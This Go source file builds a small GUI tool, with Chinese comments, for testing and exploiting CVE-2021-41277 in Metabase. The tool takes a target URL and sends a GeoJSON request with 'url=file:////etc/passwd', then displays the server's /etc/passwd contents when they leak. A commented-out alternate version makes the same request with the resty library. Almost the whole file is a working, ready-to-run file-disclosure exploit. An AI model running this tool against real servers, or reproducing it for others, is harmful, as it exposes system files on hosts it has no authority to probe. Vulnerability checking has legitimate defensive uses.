package main

import (
	"io"
	"log"
	"net/http"
	"os"
	"strings"
	"time"

	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/layout"
	"fyne.io/fyne/v2/widget"
	"github.com/flopp/go-findfont"
)

//初始化工具的文字，让它能识别汉字，这个函数自行选择保存或删除，加了go run时会比较卡
func init() {
	fontPaths := findfont.List()
	for _, path := range fontPaths {
		if strings.Contains(path, "simkai.ttf") {
			os.Setenv("FYNE_FONT", path)
		}
	}
}

func main() {

	myApp := app.New()
	//工具的标题
	myWin := myApp.NewWindow("CVE-2021-41277测试工具")
	//整个框架的大小
	myWin.Resize(fyne.NewSize(700, 430))
	myWin.SetFixedSize(true)
	nameEntry := widget.NewMultiLineEntry()
	nameEntry.Wrapping = fyne.TextWrapWord
	nameEntry.SetPlaceHolder("please input your url")
	tab := widget.NewMultiLineEntry()
	testBtn := widget.NewButton("Expolit", func() {
		nameEntry.Text = strings.TrimRight(nameEntry.Text, "/")
		tab.SetText(IsVulnerable(nameEntry.Text))
	})
	//这个显示整个的布局规划，有nameEntry（输入）、testBtn（按钮）、tab输出，这里有一个小细节，fyne.NewSize(690, 300)的690宽度要比整个框架的700小一点，不然会不会吃掉滑动条
	content := container.New(layout.NewVBoxLayout(), nameEntry, testBtn, container.New(layout.NewGridWrapLayout(fyne.NewSize(690, 300)), tab))
	myWin.SetContent(content)
	myWin.ShowAndRun()

}

func IsVulnerable(target string) (result string) {
	url := target + "/api/geojson?url=file:////etc/passwd"
	client := http.Client{
		Timeout: 15 * time.Second,
	}
	resp, err := client.Get(url)
	if err != nil {
		result = "存在异常\n" + err.Error()
	} else {
		if resp.StatusCode == http.StatusOK {
			bodyBytes, err := io.ReadAll(resp.Body)
			if err != nil {
				log.Fatal(err)
				result = "存在异常\n" + err.Error()
			}
			bodyString := string(bodyBytes)
			if strings.Contains(bodyString, "root:") {
				result = target + "存在漏洞\n [" + url + "]\n" + bodyString
			}
		} else {
			result = target + "不存在漏洞"
		}

	}
	return result
}

/* 预言哥教的第二种写法，代码比较优雅简洁
import (
	"github.com/go-resty/resty/v2"
)

func IsVulnerable(target string) (result string) {
	client := resty.New()
	target = strings.TrimRight(target, "/")
	url := target + "/api/geojson?url=file:////etc/passwd"
	resp, _ := client.R().EnableTrace().Get(url)

	if resp.StatusCode() == 200 && strings.Contains(string(resp.Body()), "root:") {
		result = string(resp.Body())
	} else {
		result = target + " 不存在漏洞"
	}

	return result

}
*/
